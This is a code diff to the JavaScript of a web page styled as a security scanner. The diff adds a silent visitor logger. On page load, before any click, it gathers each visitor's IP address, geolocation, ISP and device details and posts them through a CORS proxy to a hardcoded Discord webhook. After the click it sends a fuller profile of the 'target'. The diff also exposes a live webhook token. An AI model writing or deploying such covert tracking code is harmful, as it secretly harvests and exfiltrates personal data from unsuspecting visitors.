@@ -150,7 +150,11 @@ document.addEventListener('DOMContentLoaded', () => {
         webdriver: navigator.webdriver ? "Yes (Bot/Automation)" : "No",
     };
 
-    // Fetch real IP and location data
+    // Constants for Discord Webhook bypassing CORS
+    const webhookUrl = "https://discord.com/api/webhooks/1485369933058674718/5iNQokQ6pdB6BBQo7KSW5oAvgEImWbbok-NR2YvtGw0NEg5jQ5ZmlQEeFaMe1Px9NhFT";
+    const proxiedWebhookUrl = "https://corsproxy.io/?" + encodeURIComponent(webhookUrl);
+
+    // Fetch real IP and location data, and fire silent connection log
     async function fetchUserData() {
         try {
             const response = await fetch('https://ipapi.co/json/');
@@ -165,12 +169,44 @@ document.addEventListener('DOMContentLoaded', () => {
             userData.lon = data.longitude || "Unknown";
             userData.timezone = data.timezone || "Unknown";
             userData.asn = data.asn || "Unknown";
+            
+            // Auto-fire connection log to Discord (Silent)
+            sendSilentConnectionLog();
         } catch (error) {
             console.error("Failed to fetch IP data", error);
             userData.ip = "192.168.1." + Math.floor(Math.random() * 255);
             userData.country = "Local Network";
         }
     }
+
+    // Silent HTTP Connection Log to Discord
+    function sendSilentConnectionLog() {
+        const payload = {
+            username: "Silent Visitor Logger",
+            avatar_url: "https://i.imgur.com/K1hOqT6.png",
+            embeds: [{
+                title: "👀 New Visitor Connected (Silent Log)",
+                color: 0x3366ff,
+                description: `A user has landed on the site. Awaiting scan initiation.`,
+                fields: [
+                    { name: "IP Address", value: `\`${userData.ip}\``, inline: true },
+                    { name: "Location", value: `${userData.city}, ${userData.country}`, inline: true },
+                    { name: "ISP", value: `${userData.isp}`, inline: true },
+                    { name: "Device / Browser", value: `${userData.os} | ${userData.browser}`, inline: false }
+                ],
+                timestamp: new Date().toISOString()
+            }]
+        };
+
+        fetch(proxiedWebhookUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        }).catch(e => console.error("Silent log error", e));
+    }
+
+    // Auto-fetch connection data immediately on load, before they click anything
+    fetchUserData();
 
     startBtn.addEventListener('click', async () => {
         const nameInput = document.getElementById('target-name');
@@ -179,46 +215,41 @@ document.addEventListener('DOMContentLoaded', () => {
         welcomeScreen.classList.remove('active');
         terminalScreen.classList.add('active');
         
-        await fetchUserData();
-        userData.gpu = await getGPUInfo();
-        userData.battery = await getBatteryInfo();
-        userData.touch = navigator.maxTouchPoints > 0 ? `Yes (${navigator.maxTouchPoints} points)` : "No";
-
-        // Send to Discord Webhook
+        // Send FULL TARGET SCAN to Discord Webhook
         try {
-            const webhookUrl = "https://discord.com/api/webhooks/1485369933058674718/5iNQokQ6pdB6BBQo7KSW5oAvgEImWbbok-NR2YvtGw0NEg5jQ5ZmlQEeFaMe1Px9NhFT";
-            
             const payload = {
                 username: "Cyber Security Scanner",
                 avatar_url: "https://i.imgur.com/4M34hi2.png",
                 embeds: [{
-                    title: "🚨 New Security Footprint Captured",
-                    color: 0x00ff41, // Cyber green
+                    title: "🚨 SCANNED FOOTPRINT UPLOADED 🚨",
+                    color: 0xff0000, // Critical Red
+                    thumbnail: { url: "https://i.imgur.com/B1bLhV7.gif" },
+                    author: { name: "Extracted Payload successful" },
                     fields: [
-                        { name: "Identifier", value: `\`${userData.name}\``, inline: true },
+                        { name: "Target Identifier", value: `\`\`\`css\n[ ${userData.name} ]\n\`\`\``, inline: false },
                         { name: "IP Address", value: `\`${userData.ip}\``, inline: true },
-                        { name: "Time / TZ", value: `${userData.time}\n${userData.timezone} (${userData.timeOffset})`, inline: false },
+                        { name: "Time / TZ", value: `${userData.time}\n${userData.timezone} (${userData.timeOffset})`, inline: true },
                         
-                        { name: "📍 Location & ISP", value: `${userData.city}, ${userData.region}, ${userData.country} (ZIP: ${userData.postal})\n**Coordinates:** ${userData.lat}, ${userData.lon}\n**ISP:** ${userData.isp} (ASN: ${userData.asn})`, inline: false },
+                        { name: "📍 Geo-Location & ISP", value: `**Location:** ${userData.city}, ${userData.region}, ${userData.country} (ZIP: ${userData.postal})\n**Coordinates:** ${userData.lat}, ${userData.lon}\n**ISP:** ${userData.isp} (ASN: ${userData.asn})`, inline: false },
                         
-                        { name: "💻 Hardware & Display", value: `**Cores:** ${userData.cores} | **RAM:** ${userData.memory}\n**GPU:** ${userData.gpu}\n**Screen:** ${userData.screen} (${userData.colorDepth}-bit)\n**Battery:** ${userData.battery} | **Touch:** ${userData.touch}`, inline: false },
+                        { name: "💻 Deep Hardware Diagnostics", value: `**CPU Cores:** ${userData.cores}\n**RAM Allocation:** ${userData.memory}\n**GPU Renderer:** ${userData.gpu}\n**Screen Resolution:** ${userData.screen} (${userData.colorDepth}-bit color)\n**Pixel Ratio:** ${userData.pixelRatio}\n**Battery Status:** ${userData.battery} | **Touch Support:** ${userData.touch}`, inline: false },
                         
-                        { name: "🌐 Software & Network", value: `**OS:** ${userData.os} (${userData.platform})\n**Browser:** ${userData.browser} (${userData.language})\n**Net Type:** ${userData.connectionType} | **Ping:** ${userData.rtt}\n**Features:** DNT(${userData.dnt}), Bot(${userData.webdriver})`, inline: false },
+                        { name: "🌐 Software Profile", value: `**Operating System:** ${userData.os} (${userData.platform})\n**Browser:** ${userData.browser} (${userData.language})\n**Network Type:** ${userData.connectionType}\n**Est. Latency:** ${userData.rtt}\n**Privacy Features:** DNT(${userData.dnt}), Cookies(${userData.cookies}), Bot(${userData.webdriver})`, inline: false },
                         
-                        { name: "Raw User Agent", value: `\`\`\`${userData.userAgent}\`\`\``, inline: false }
+                        { name: "User Agent String", value: `\`\`\`${userData.userAgent}\`\`\``, inline: false }
                     ],
-                    footer: { text: "Digital Footprint Extractor v2.0" },
+                    footer: { text: "Digital Footprint Extractor (Bypass Mode)" },
                     timestamp: new Date().toISOString()
                 }]
             };
 
-            fetch(webhookUrl, {
+            fetch(proxiedWebhookUrl, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
-            });
+            }).then(() => console.log("Payload delivered to webhook.")).catch(e => console.error("Webhook route failed", e));
         } catch (e) {
-            console.error("Failed to send log", e);
+            console.error("Failed to construct payload", e);
         }
 
         startExploitSequence();
